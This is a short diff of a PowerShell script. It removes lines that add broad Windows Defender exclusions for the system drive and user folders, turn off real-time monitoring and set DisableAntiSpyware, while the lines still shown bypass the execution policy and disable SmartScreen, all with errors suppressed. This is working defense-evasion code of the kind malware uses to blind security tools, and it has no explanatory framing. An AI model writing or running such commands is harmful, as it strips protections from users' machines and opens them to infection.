@@ -8,17 +8,7 @@ $folderPath2 = "C:\"
 $folderPath3 = "C:\ProgramData"
 $folderPath = "C:\Users\"
 
-$ProgressPreference = 'SilentlyContinue'
-Add-MpPreference -ExclusionPath $folderPath
-New-Item -ItemType Directory -Path $folderPath1 -ErrorAction SilentlyContinue
-New-Item -ItemType Directory -Path $folderPath2 -ErrorAction SilentlyContinue
-New-Item -ItemType Directory -Path $folderPath3 -ErrorAction SilentlyContinue
-Set-MpPreference -DisableRealtimeMonitoring $true
-New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue -InformationAction SilentlyContinue | Out-Null
-Add-MpPreference -ExclusionPath $folderPath1 -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionPath $folderPath2 -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionPath $folderPath3 -ErrorAction SilentlyContinue
-Set-MpPreference -DisableAutoExclusions $true
+
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' -Name 'SmartScreenEnabled' -Value 'Off' -Type String -Force -ErrorAction SilentlyContinue -InformationAction SilentlyContinue
 Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\System' -Name 'EnableSmartScreen' -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue -InformationAction SilentlyContinue
